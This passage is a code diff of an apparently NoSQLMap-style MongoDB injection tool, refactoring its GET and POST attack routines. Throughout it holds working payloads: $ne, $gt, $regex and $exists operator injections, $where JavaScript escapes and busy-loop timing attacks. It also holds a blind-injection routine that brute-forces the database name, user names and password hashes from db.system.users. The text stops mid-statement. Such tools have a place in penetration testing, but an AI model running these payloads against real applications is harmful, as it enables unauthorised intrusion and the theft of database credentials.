-            testNum += 1
-            print("\n")
-        else:
-            testNum += 1
-
-        postData.update(
-            {injOpt: "1; return this.a != '" + injectString + "'; var dummy=1"}
-        )
-        body = urllib.parse.urlencode(postData)
-        req = urllib.request.Request(appURL, body, requestHeaders)
-
-        if verb == "ON":
-            print(
-                "Testing Mongo this not equals integer escape attack for all records..."
-            )
-            print(" Injecting " + str(postData))
-        else:
-            print("Test 8:  This != injection (integer escape)")
-
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, postData)
-            testNum += 1
-
-        else:
-            testNum += 1
-        print("\n")
-
-        doTimeAttack = "N"
-        if args == None:
-            doTimeAttack = input("Start timing based tests (y/n)? ")
-
-        if doTimeAttack == "y" or doTimeAttack == "Y":
-            print("Starting Javascript string escape time based injection...")
-            postData.update(
-                {
-                    injOpt: "a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"
-                }
-            )
-            body = urllib.parse.urlencode(postData)
-            conn = urllib.request.urlopen(req, body)
-            start = time.time()
-            page = conn.read()
-            end = time.time()
-            conn.close()
-            print(str(end))
-            print(str(start))
-            strTimeDelta = int(round((end - start), 3)) - timeBase
-            if strTimeDelta > 25:
-                print(
-                    "HTTP load time variance was "
-                    + str(strTimeDelta)
-                    + "  seconds! Injection possible."
-                )
-                strTbAttack = True
-
-            else:
-                print(
-                    "HTTP load time variance was only "
-                    + str(strTimeDelta)
-                    + " seconds.  Injection probably didn't work."
-                )
-                strTbAttack = False
-
-            print("Starting Javascript integer escape time based injection...")
-
-            postData.update(
-                {
-                    injOpt: "1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"
-                }
-            )
-            body = urllib.parse.urlencode(postData)
-            start = time.time()
-            conn = urllib.request.urlopen(req, body)
-            page = conn.read()
-            end = time.time()
-            conn.close()
-            print(str(end))
-            print(str(start))
-            intTimeDelta = (end - start) - timeBase
-            if intTimeDelta > 25:
-                print(
-                    "HTTP load time variance was "
-                    + str(intTimeDelta)
-                    + " seconds! Injection possible."
-                )
-                intTbAttack = True
-
-            else:
-                print(
-                    "HTTP load time variance was only "
-                    + str(intTimeDelta)
-                    + " seconds.  Injection probably didn't work."
-                )
-                intTbAttack = False
-
-        print("\n")
-        print("Exploitable requests:")
-        print("\n".join(decode_payloads(vulnAddrs)))
-        print("\n")
-        print("Possibly vulnerable requests:")
-        print("\n".join(decode_payloads(possAddrs)))
-        print("\n")
-        print("Timing based attacks:")
-
-        if strTbAttack == True:
-            print("String attack-Successful")
-        else:
-            print("String attack-Unsuccessful")
-        if intTbAttack == True:
-            print("Integer attack-Successful")
-        else:
-            print("Integer attack-Unsuccessful")
-
-        if args == None:
-            fileOut = input("Save results to file (y/n)? ")
-        else:
-            fileOut = "y" if args.savePath else "n"
-
-        if fileOut.lower() == "y":
-            if args == None:
-                savePath = input("Enter output file name: ")
-            else:
-                savePath = args.savePath
-            save_to(savePath, vulnAddrs, possAddrs, strTbAttack, intTbAttack)
-    if args == None:
-        input("Press enter to continue...")
-    return ()
+    def request(self, url=None, data=None):
+        """Send a request and return the response body as text."""
+        return self.timed_request(url, data)[0]
 
 
-def errorTest(errorCheck, testNum, uriIndex=None):
-    global possAddrs
-    global httpMethod
-    global neDict
-    global gtDict
-    global postData
+# ---------------------------------------------------------------------------
+# Result handling
+# ---------------------------------------------------------------------------
 
-    if (
-        errorCheck.find("ReferenceError") != -1
-        or errorCheck.find("SyntaxError") != -1
-        or errorCheck.find("ILLEGAL") != -1
-    ):
+class Findings:
+    """Attack results, passed explicitly instead of via module globals."""
+
+    def __init__(self):
+        self.vulnerable = []
+        self.possible = []
+        self.string_timing = False
+        self.integer_timing = False
+        self.mongo_lt_24 = False
+
+
+def errorTest(body, request_repr, findings):
+    """Record ``request_repr`` as possibly vulnerable when ``body`` contains
+    a MongoDB error.  Returns True when an error was found."""
+    if any(marker in body for marker in _ERROR_MARKERS):
         print("Injection returned a MongoDB Error.  Injection may be possible.")
-
-        if httpMethod == "GET":
-            possAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
-            return True
-
-        else:
-            if testNum == 1:
-                possAddrs.append(str(neDict))
-                return True
-
-            elif testNum == 2:
-                possAddrs.append(str(gtDict))
-                return True
-
-            else:
-                possAddrs.append(str(postData))
-                return True
-    else:
-        return False
+        findings.possible.append(request_repr)
+        return True
+    return False
 
 
-def checkResult(baseSize, respSize, testNum, verb, postData, uriIndex=None):
-    global vulnAddrs
-    global possAddrs
-    global lt24
-    global str24
-    global int24
-    global httpMethod
-    global neDict
-    global gtDict
+def checkResult(base_size, resp_size, test_num, request_repr, findings, verb="OFF"):
+    """Compare an injected response to the baseline and record the result."""
+    delta = abs(resp_size - base_size)
 
-    delta = abs(respSize - baseSize)
-    if (delta >= 100) and (respSize != 0):
+    if delta >= 100 and resp_size != 0:
         if verb == "ON":
             print(
                 "Response varied "
@@ -993,28 +316,12 @@ def checkResult(baseSize, respSize, testNum, verb, postData, uriIndex=None):
             )
         else:
             print("Successful injection!")
+        findings.vulnerable.append(request_repr)
+        # The $where escape payloads (tests 3-6) only work on MongoDB < 2.4.
+        if test_num in (3, 4, 5, 6):
+            findings.mongo_lt_24 = True
 
-        if httpMethod == "GET":
-            vulnAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
-        else:
-            if testNum == 1:
-                vulnAddrs.append(str(neDict))
-
-            elif testNum == 2:
-                vulnAddrs.append(str(gtDict))
-            else:
-                vulnAddrs.append(str(postData))
-
-        if testNum == 3 or testNum == 5:
-            lt24 = True
-            str24 = True
-
-        elif testNum == 4 or testNum == 6:
-            lt24 = True
-            int24 = True
-        return
-
-    elif (delta > 0) and (delta < 100) and (respSize != 0):
+    elif 0 < delta < 100 and resp_size != 0:
         if verb == "ON":
             print(
                 "Response variance was only "
@@ -1023,15 +330,7 @@ def checkResult(baseSize, respSize, testNum, verb, postData, uriIndex=None):
             )
         else:
             print("Possible injection.")
-
-        if httpMethod == "GET":
-            possAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
-        else:
-            if testNum == 1:
-                possAddrs.append(str(neDict))
-            else:
-                possAddrs.append(str(postData))
-        return
+        findings.possible.append(request_repr)
 
     elif delta == 0:
         if verb == "ON":
@@ -1040,7 +339,6 @@ def checkResult(baseSize, respSize, testNum, verb, postData, uriIndex=None):
             )
         else:
             print("Injection failed.")
-        return
 
     else:
         if verb == "ON":
@@ -1049,15 +347,342 @@ def checkResult(baseSize, respSize, testNum, verb, postData, uriIndex=None):
             )
         else:
             print("Possible injection.")
-        if httpMethod == "GET":
-            possAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
+        findings.possible.append(request_repr)
+
+
+def decode_payloads(addrs):
+    """Return ``addrs`` with each URL's query string decoded so the injection
+    payload is human-readable (e.g. ``acctid[$ne]=...`` instead of
+    ``acctid%5B%24ne%5D=...``). Non-URL entries (e.g. POST-data dict strings)
+    are passed through unchanged."""
+    decoded = []
+    for addr in addrs:
+        if isinstance(addr, str) and "?" in addr:
+            path, _, query = addr.partition("?")
+            addr = path + "?" + urllib.parse.unquote_plus(query)
+        decoded.append(addr)
+    return decoded
+
+
+def save_to(savePath, findings):
+    with open(savePath, "w") as fo:
+        fo.write("Vulnerable URLs:\n")
+        fo.write("\n".join(decode_payloads(findings.vulnerable)))
+        fo.write("\n\n")
+        fo.write("Possibly Vulnerable URLs:\n")
+        fo.write("\n".join(decode_payloads(findings.possible)))
+        fo.write("\n")
+        fo.write("Timing based attacks:\n")
+        fo.write(
+            "String Attack-"
+            + ("Successful\n" if findings.string_timing else "Unsuccessful\n")
+        )
+        fo.write(
+            "Integer attack-"
+            + ("Successful\n" if findings.integer_timing else "Unsuccessful\n")
+        )
+
+
+def print_report(findings, vuln_label="Vulnerable URLs:", poss_label="Possibly vulnerable URLs:"):
+    print("\n")
+    print(vuln_label)
+    print("\n".join(decode_payloads(findings.vulnerable)))
+    print("\n")
+    print(poss_label)
+    print("\n".join(decode_payloads(findings.possible)))
+    print("\n")
+    print("Timing based attacks:")
+    print("String attack-" + ("Successful" if findings.string_timing else "Unsuccessful"))
+    print("Integer attack-" + ("Successful" if findings.integer_timing else "Unsuccessful"))
+
+
+def _timing_test(send, time_base, label):
+    """Run one timing-based test.  ``send`` is a zero-arg callable that
+    performs the request and returns the elapsed seconds."""
+    print(label + "...")
+    delta = int(round(send(), 3)) - time_base
+    # The sleep payloads run per document, so the total delay scales with the
+    # number of records; a high bar avoids false positives from small delays.
+    if delta > 25:
+        print(
+            "HTTP load time variance was "
+            + str(delta)
+            + " seconds! Injection possible."
+        )
+        return True
+
+    print(
+        "HTTP load time variance was only "
+        + str(delta)
+        + " seconds.  Injection probably didn't work."
+    )
+    return False
+
+
+def _post_timing(client, base_data, param, payload, time_base, label):
+    """Run one POST timing-based test with ``payload`` in ``param``."""
+    data = dict(base_data)
+    data[param] = payload
+    return _timing_test(lambda: client.timed_request(data=_post_body(data))[1], time_base, label)
+
+
+def _prompt_size():
+    while True:
+        size = input("Baseline test-Enter random string size: ")
+        if size.isdigit():
+            return int(size)
+        print("Invalid! The size should be an integer.")
+
+
+def _prompt_injection_size_and_format(args):
+    """Return ``(size, format)`` from the CLI args or the interactive menu."""
+    if args is None:
+        size = _prompt_size()
+        return size, randInjString(size)
+    # ``--injectFormat`` is optional; default to alphanumeric ("1").
+    return int(args.injectSize), args.injectFormat or "1"
+
+
+def _prompt_save(findings, args):
+    """Save the findings when the user (or ``--savePath``) asks for it."""
+    if args is None:
+        file_out = input("Save results to file (y/n)? ")
+    else:
+        file_out = "y" if args.savePath else "n"
+
+    if file_out.lower() == "y":
+        save_path = input("Enter output file name: ") if args is None else args.savePath
+        save_to(save_path, findings)
+
+
+# ---------------------------------------------------------------------------
+# GET attack
+# ---------------------------------------------------------------------------
+
+def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
+    print("Web App Attacks (GET)")
+    print("===============")
+
+    scheme = "https" if https == "ON" else "http"
+    app_url = (
+        scheme + "://" + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip()
+    )
+
+    print("Checking to see if site at " + app_url + " is up...")
+    client = WebClient(app_url, requestHeaders)
+    code, body, time_base = client.probe()
+
+    if code is None:
+        return ()
+    if code != 200:
+        print("Got " + str(code) + " from the app, check your options.")
+        return ()
+
+    norm_length = len(body)
+    if verb == "ON":
+        print(
+            "App is up! Got response length of "
+            + str(norm_length)
+            + " and response time of "
+            + str(round(time_base, 3))
+            + " seconds.  Starting injection test.\n"
+        )
+    else:
+        print("App is up!")
+
+    inject_size, string_format = _prompt_injection_size_and_format(args)
+    inject_string = build_random_string(string_format, inject_size)
+    print("Using " + inject_string + " for injection testing.\n")
+
+    if "?" not in app_url:
+        print("No URI parameters provided for GET request...Check your options.\n")
+        if args is None:
+            input("Press enter to continue...")
+        return ()
+
+    random_uri = buildUri(app_url, inject_string, args)
+    print("URI : " + random_uri)
+
+    if verb == "ON":
+        print(
+            "Checking random injected parameter HTTP response size using "
+            + random_uri
+            + "...\n"
+        )
+    else:
+        print("Sending random parameter value...")
+
+    rand_length = len(client.request(random_uri))
+    print("Got response length of " + str(rand_length) + ".")
+
+    delta = abs(norm_length - rand_length)
+    if delta == 0:
+        print("No change in response size injecting a random parameter..\n")
+    else:
+        print("Random value variance: " + str(delta) + "\n")
+
+    findings = Findings()
+    for i, (num, label, idx, verbose) in enumerate(GET_TESTS):
+        if i:
+            print()
+        target = uriArray[idx]
+        if verb == "ON":
+            print(verbose.format(uri=target))
         else:
-            if testNum == 1:
-                possAddrs.append(str(neDict))
-            else:
-                possAddrs.append(str(postData))
+            print("Test " + str(num) + ": " + label)
+        body = client.request(target)
+        if not errorTest(body, target, findings):
+            checkResult(rand_length, len(body), num, target, findings, verb)
+
+    if args is None:
+        do_time_attack = input("Start timing based tests (y/n)? ")
+    else:
+        # ``--doTimeAttack`` is optional; default to "n" when not supplied.
+        do_time_attack = args.doTimeAttack or "n"
+
+    if do_time_attack.lower() == "y":
+        findings.string_timing = _timing_test(
+            lambda: client.timed_request(uriArray[18])[1],
+            time_base,
+            "Starting Javascript string escape time based injection",
+        )
+        findings.integer_timing = _timing_test(
+            lambda: client.timed_request(uriArray[9])[1],
+            time_base,
+            "Starting Javascript integer escape time based injection",
+        )
+
+    if findings.mongo_lt_24 and args is None:
+        if (
+            input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ").lower()
+            == "y"
+        ):
+            getDBInfo(client)
+
+    print_report(findings)
+    _prompt_save(findings, args)
+
+    if args is None:
+        input("Press enter to continue...")
+    return ()
+
+
+# ---------------------------------------------------------------------------
+# POST attack
+# ---------------------------------------------------------------------------
+
+def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=None):
+    print("Web App Attacks (POST)")
+    print("===============")
+
+    scheme = "https" if https == "ON" else "http"
+    app_url = scheme + "://" + str(victim) + ":" + str(webPort) + str(uri)
+
+    print("Checking to see if site at " + app_url + " is up...")
+    client = WebClient(app_url, requestHeaders)
+    base_data = dict(postData)  # work on a copy; never mutate the caller's dict
+
+    code, body, time_base = client.probe(data=_post_body(base_data))
+
+    if code is None:
+        return ()
+    if code != 200:
+        print("Got " + str(code) + " from the app, check your options.")
+        return ()
+
+    norm_length = len(body)
+    if verb == "ON":
+        print(
+            "App is up! Got response length of "
+            + str(norm_length)
+            + " and response time of "
+            + str(round(time_base, 3))
+            + " seconds.  Starting injection test.\n"
+        )
+    else:
+        print("App is up!")
+
+    print("List of parameters:")
+    for i, name in enumerate(base_data, start=1):
+        print(str(i) + "-" + name)
+
+    try:
+        if args is None:
+            inj_index = int(input("Which parameter should we inject? "))
+        else:
+            inj_index = int(args.injectedParameter)
+    except (ValueError, IndexError):
+        if args is None:
+            input("Something went wrong.  Press enter to return to the main menu...")
         return
 
+    inj_opt = list(base_data)[inj_index - 1]
+    print("Injecting the " + inj_opt + " parameter...")
+
+    inject_size, string_format = _prompt_injection_size_and_format(args)
+    inject_string = build_random_string(string_format, inject_size)
+    print("Using " + inject_string + " for injection testing.\n")
+
+    # Baseline: the selected parameter set to a random value.
+    base_data[inj_opt] = inject_string
+    if verb == "ON":
+        print(
+            "Checking random injected parameter HTTP response size sending "
+            + str(base_data)
+            + "...\n"
+        )
+    else:
+        print("Sending random parameter value...")
+
+    rand_length = len(client.request(data=_post_body(base_data)))
+    print("Got response length of " + str(rand_length) + ".")
+
+    delta = abs(norm_length - rand_length)
+    if delta == 0:
+        print("No change in response size injecting a random parameter..\n")
+    else:
+        print("Random value variance: " + str(delta) + "\n")
+
+    findings = Findings()
+    for i, (num, label, spec, verbose) in enumerate(POST_TESTS):
+        if i:
+            print()
+        data = _post_data(base_data, inj_opt, spec, inject_string)
+        if verb == "ON":
+            print(verbose.format(data=str(data)))
+        else:
+            print("Test " + str(num) + ": " + label)
+        body = client.request(data=_post_body(data))
+        if not errorTest(body, str(data), findings):
+            checkResult(rand_length, len(body), num, str(data), findings, verb)
+
+    do_time_attack = "n"
+    if args is None:
+        do_time_attack = input("Start timing based tests (y/n)? ")
+
+    if do_time_attack.lower() == "y":
+        findings.string_timing = _post_timing(
+            client, base_data, inj_opt, POST_TIMING_STRING, time_base,
+            "Starting Javascript string escape time based injection",
+        )
+        findings.integer_timing = _post_timing(
+            client, base_data, inj_opt, POST_TIMING_INTEGER, time_base,
+            "Starting Javascript integer escape time based injection",
+        )
+
+    print_report(
+        findings, vuln_label="Exploitable requests:", poss_label="Possibly vulnerable requests:"
+    )
+    _prompt_save(findings, args)
+
+    if args is None:
+        input("Press enter to continue...")
+    return ()
+
+
+# ---------------------------------------------------------------------------
+# Random-string builders
+# ---------------------------------------------------------------------------
 
 def randInjString(size):
     print("What format should the random string take?")
@@ -1076,471 +701,157 @@ def randInjString(size):
 
 
 def build_random_string(format, size):
-    if format == "1":
+    """Build a random injection string in the requested ``format``
+    (1-alphanumeric, 2-letters, 3-digits, 4-email address)."""
+    if format == "4":  # email address
         chars = string.ascii_letters + string.digits
-        return "".join(random.choice(chars) for x in range(size))
+        local = "".join(random.choice(chars) for _ in range(size))
+        domain = "".join(random.choice(chars) for _ in range(size))
+        return local + "@" + domain + ".com"
 
-    elif format == "2":
-        chars = string.ascii_letters
-        return "".join(random.choice(chars) for x in range(size))
-
-    elif format == "3":
-        chars = string.digits
-        return "".join(random.choice(chars) for x in range(size))
-
-    else:  # format == "4":
-        chars = string.ascii_letters + string.digits
-        return (
-            "".join(random.choice(chars) for x in range(size))
-            + "@"
-            + "".join(random.choice(chars) for x in range(size))
-            + ".com"
-        )
+    chars = {
+        "1": string.ascii_letters + string.digits,
+        "2": string.ascii_letters,
+        "3": string.digits,
+    }[format]
+    return "".join(random.choice(chars) for _ in range(size))
 
 
-def buildUri(origUri, randValue, args=None):
-    paramName = []
-    paramValue = []
-    global uriArray
-    uriArray = [""] * 21
-    injOpt = []
+# ---------------------------------------------------------------------------
+# Database-info brute force (MongoDB < 2.4, via the ``---`` template)
+# ---------------------------------------------------------------------------
 
-    # Split the string between the path and parameters, and then split each parameter
-    try:
-        split_uri = origUri.split("?")
-        params = split_uri[1].split("&")
-
-    except NoSQLMapException:
-        input(
-            "Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu..."
-        )
-        return
-
-    for item in params:
-        index = item.find("=")
-        paramName.append(item[0:index])
-        paramValue.append(item[index + 1 : len(item)])
-
-    menuItem = 1
-    print("List of parameters:")
-    for params in paramName:
-        print(str(menuItem) + "-" + params)
-        menuItem += 1
-
-    try:
-        if args == None:
-            injIndex = input("Enter parameters to inject in a comma separated list:  ")
-        else:
-            injIndex = args.params
-
-        for params in injIndex.split(","):
-            injOpt.append(paramName[int(params) - 1])
-
-        for params in injOpt:
-            print("Injecting the " + params + " parameter...")
-
-    except NoSQLMapException:
-        input("Something went wrong.  Press enter to return to the main menu...")
-        return
-
-    x = 0
-
-    for item in paramName:
-
-        if paramName[x] in injOpt:
-            uriArray[0] += paramName[x] + "=" + randValue + "&"
-            uriArray[1] += paramName[x] + "[$ne]=&"
-            uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-            uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
-            uriArray[4] += (
-                paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-            )
-            uriArray[5] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
-            uriArray[6] += (
-                paramName[x]
-                + "=a'; return this.a != '"
-                + randValue
-                + "'; var dummy='!"
-                + "&"
-            )
-            uriArray[7] += (
-                paramName[x]
-                + "=1; return this.a !="
-                + randValue
-                + "; var dummy=1"
-                + "&"
-            )
-            uriArray[8] += paramName[x] + "[$gt]=&"
-            uriArray[9] += (
-                paramName[x]
-                + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"
-                + "&"
-            )
-            uriArray[10] += (
-                paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
-            )
-            uriArray[11] += (
-                paramName[x]
-                + "=a\"; return this.a != '"
-                + randValue
-                + "'; var dummy='!"
-                + "&"
-            )
-            uriArray[12] += (
-                paramName[x] + '=a"; return db.a.findOne(); var dummy="!' + "&"
-            )
-            uriArray[13] += (
-                paramName[x]
-                + '=a"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy="!'
-                + "&"
-            )
-            uriArray[14] += paramName[x] + "a'; return true; var dum='a"
-            uriArray[15] += paramName[x] + "1; return true; var dum=2"
-            # Add values that can be manipulated for database attacks
-            uriArray[16] += paramName[x] + "=a'; ---"
-            uriArray[17] += paramName[x] + "=1; if ---"
-            uriArray[18] += (
-                paramName[x]
-                + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"
-                + "&"
-            )
-            # Associative-array operator payloads (added for broader operator
-            # coverage): $regex, $exists. They use empty values because an
-            # empty value is the reliable bypass for these operators (a
-            # non-empty random value often matches nothing).
-            uriArray[19] += paramName[x] + "[$regex]=&"
-            uriArray[20] += paramName[x] + "[$exists]=&"
-
-        else:
-            uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[1] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[2] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[3] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[4] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[5] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[6] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[14] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[15] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[16] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[17] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[18] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[19] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[20] += paramName[x] + "=" + paramValue[x] + "&"
-        x += 1
-
-    # Clip the extra & off the end of the URL
-    x = 0
-    while x <= 20:
-        uriArray[x] = (
-            split_uri[0] + "?" + urllib.parse.quote_plus(uriArray[x][:-1])
-        )
-
-        x += 1
-
-    return uriArray[0]
+def _substitute(uri, old, new):
+    """Replace ``old`` with ``new`` in a payload URL's query string, keeping
+    the result properly percent-encoded."""
+    path, _, query = uri.partition("?")
+    decoded = urllib.parse.unquote_plus(query)
+    return path + "?" + urllib.parse.quote_plus(decoded.replace(old, new))
 
 
-def getDBInfo():
-    curLen = 0
-    nameLen = 0
-    gotFullDb = False
-    gotNameLen = False
-    gotDbName = False
-    gotColLen = False
-    gotColName = False
-    gotUserCnt = False
-    finUser = False
-    dbName = ""
-    charCounter = 0
-    nameCounter = 0
-    usrCount = 0
-    retrUsers = 0
-    users = []
-    hashes = []
-    crackHash = ""
+def _send_template(client, js):
+    """Send the DB-info template (``uriArray[16]``) with ``---`` replaced by
+    ``js`` and return the response body."""
+    return client.request(_substitute(uriArray[16], "---", js))
 
-    chars = string.ascii_letters + string.digits
+
+def _brute_length(js_for_n, client, base_len):
+    """Increment n until ``js_for_n(n)`` returns the baseline response size."""
+    n = 0
+    while True:
+        if len(_send_template(client, js_for_n(n))) == base_len:
+            return n
+        n += 1
+
+
+def _brute_value(js_for_pos_char, client, base_len, length, alphabet):
+    """Recover a value of known ``length`` by brute-forcing each character."""
+    chars = []
+    for pos in range(length):
+        for ch in alphabet:
+            if len(_send_template(client, js_for_pos_char(pos, ch))) == base_len:
+                chars.append(ch)
+                break
+    return "".join(chars)
+
+
+def _recover_user(client, base_len, skip):
+    """Brute-force the next user name and its 32-character password hash.
+
+    ``skip`` is the list of user names already recovered; the queries use
+    ``{$nin: skip}`` so the next user is returned.
+    """
+    alphabet = string.ascii_letters + string.digits
+    if skip:
+        find = "db.system.users.findOne({user:{$nin:" + str(skip) + "}})"
+    else:
+        find = "db.system.users.findOne()"
+    prefix = "var usr = " + find + "; if ("
+
+    user_len = _brute_length(
+        lambda n: prefix
+        + "usr.user.length == " + str(n) + ") { return true; } var dum='a" + "&",
+        client,
+        base_len,
+    )
+    username = _brute_value(
+        lambda i, c: prefix
+        + "usr.user.charAt(" + str(i) + ") == '" + c + "') { return true; } var dum='a" + "&",
+        client,
+        base_len,
+        user_len,
+        alphabet,
+    )
+    pwd_hash = _brute_value(
+        lambda i, c: prefix
+        + "usr.pwd.charAt(" + str(i) + ") == '" + c + "') { return true; } var dum='a" + "&",
+        client,
+        base_len,
+        32,
+        alphabet,
+    )
+    return username, pwd_hash
+
+
+def getDBInfo(client):
+    """Brute-force the database name, user names and password hashes through
+    the ``---`` template in ``uriArray[16]``."""
+    alphabet = string.ascii_letters + string.digits
+
     print("Getting baseline True query return size...")
-    trueUri = uriArray[16].replace("---", "return true; var dummy ='!" + "&")
-    req = urllib.request.Request(trueUri, None, requestHeaders)
-    baseLen = int(len(getResponseBodyHandlingErrors(req)))
-    print("Got baseline true query length of " + str(baseLen))
+    base_len = len(_send_template(client, "return true; var dummy ='!" + "&"))
+    print("Got baseline true query length of " + str(base_len))
 
     print("Calculating DB name length...")
+    db_name_len = _brute_length(
+        lambda n: "var curdb = db.getName(); if (curdb.length == "
+        + str(n)
+        + ") {return true;} var dum='a"
+        + "&",
+        client,
+        base_len,
+    )
+    print("Got database name length of " + str(db_name_len) + " characters.")
 
-    while gotNameLen == False:
-        calcUri = uriArray[16].replace(
-            "---",
-            "var curdb = db.getName(); if (curdb.length =="
-            + str(curLen)
-            + ") {return true;} var dum='a"
-            + "&",
-        )
-        req = urllib.request.Request(calcUri, None, requestHeaders)
-        lenUri = int(len(getResponseBodyHandlingErrors(req)))
+    print("Database Name: ", end="")
+    db_name = _brute_value(
+        lambda i, c: "var curdb = db.getName(); if (curdb.charAt("
+        + str(i)
+        + ") == '"
+        + c
+        + "') { return true; } var dum='a"
+        + "&",
+        client,
+        base_len,
+        db_name_len,
+        alphabet,
+    )
+    print(db_name)
 
-        if lenUri == baseLen:
-            print("Got database name length of " + str(curLen) + " characters.")
-            gotNameLen = True
+    if input("Get database users and password hashes (y/n)? ").lower() != "y":
+        return
 
-        else:
-            curLen += 1
+    user_count = _brute_length(
+        lambda n: "var usrcnt = db.system.users.count(); if (usrcnt == "
+        + str(n)
+        + ") { return true; } var dum='a",
+        client,
+        base_len,
+    )
+    print("Found " + str(user_count) + " user(s).")
 
-    print("Database Name: ", end=" ")
-    while gotDbName == False:
-        charUri = uriArray[16].replace(
-            "---",
-            "var curdb = db.getName(); if (curdb.charAt("
-            + str(nameCounter)
-            + ") == '"
-            + chars[charCounter]
-            + "') { return true; } var dum='a"
-            + "&",
-        )
+    users, hashes = [], []
+    for _ in range(user_count):
+        username, pwd_hash = _recover_user(client, base_len, users)
+        users.append(username)
+        hashes.append(pwd_hash)
+        print("Got user:hash " + username + ":" + pwd_hash)
 
-        req = urllib.request.Request(charUri, None, requestHeaders)
-        lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-        if lenUri == baseLen:
-            dbName = dbName + chars[charCounter]
-            print(chars[charCounter], end=" ")
-            nameCounter += 1
-            charCounter = 0
-
-            if nameCounter == curLen:
-                gotDbName = True
-
-        else:
-            charCounter += 1
-    print("\n")
-
-    getUserInf = input("Get database users and password hashes (y/n)? ")
-
-    if getUserInf.lower() == "y":
-        charCounter = 0
-        nameCounter = 0
-        # find the total number of users on the database
-        while gotUserCnt == False:
-            usrCntUri = uriArray[16].replace(
-                "---",
-                "var usrcnt = db.system.users.count(); if (usrcnt == "
-                + str(usrCount)
-                + ") { return true; } var dum='a",
-            )
-
-            req = urllib.request.Request(usrCntUri, None, requestHeaders)
-            lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-            if lenUri == baseLen:
-                print("Found " + str(usrCount) + " user(s).")
-                gotUserCnt = True
-
-            else:
-                usrCount += 1
-
-        usrChars = 0  # total number of characters in username
-        charCounterUsr = 0  # position in the character array-Username
-        rightCharsUsr = 0  # number of correct characters-Username
-        rightCharsHash = 0  # number of correct characters-hash
-        charCounterHash = 0  # position in the character array-hash
-        username = ""
-        pwdHash = ""
-        charCountUsr = False
-        query = "{}"
-
-        while retrUsers < usrCount:
-            if retrUsers == 0:
-                while charCountUsr == False:
-                    # different query to get the first user vs. others
-                    usrUri = uriArray[16].replace(
-                        "---",
-                        "var usr = db.system.users.findOne(); if (usr.user.length == "
-                        + str(usrChars)
-                        + ") { return true; } var dum='a"
-                        + "&",
-                    )
-
-                    req = urllib.request.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-                    if lenUri == baseLen:
-                        # Got the right number of characters
-                        charCountUsr = True
-
-                    else:
-                        usrChars += 1
-
-                while rightCharsUsr < usrChars:
-                    usrUri = uriArray[16].replace(
-                        "---",
-                        "var usr = db.system.users.findOne(); if (usr.user.charAt("
-                        + str(rightCharsUsr)
-                        + ") == '"
-                        + chars[charCounterUsr]
-                        + "') { return true; } var dum='a"
-                        + "&",
-                    )
-
-                    req = urllib.request.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-                    if lenUri == baseLen:
-                        username = username + chars[charCounterUsr]
-                        rightCharsUsr += 1
-                        charCounterUsr = 0
-
-                    else:
-                        charCounterUsr += 1
-
-                retrUsers += 1
-                users.append(username)
-                # reinitialize all variables and get ready to do it again
-                charCountUsr = False
-                rightCharsUsr = 0
-                usrChars = 0
-                username = ""
-
-                while rightCharsHash < 32:  # Hash length is static
-                    hashUri = uriArray[16].replace(
-                        "---",
-                        "var usr = db.system.users.findOne(); if (usr.pwd.charAt("
-                        + str(rightCharsHash)
-                        + ") == '"
-                        + chars[charCounterHash]
-                        + "') { return true; } var dum='a"
-                        + "&",
-                    )
-
-                    req = urllib.request.Request(
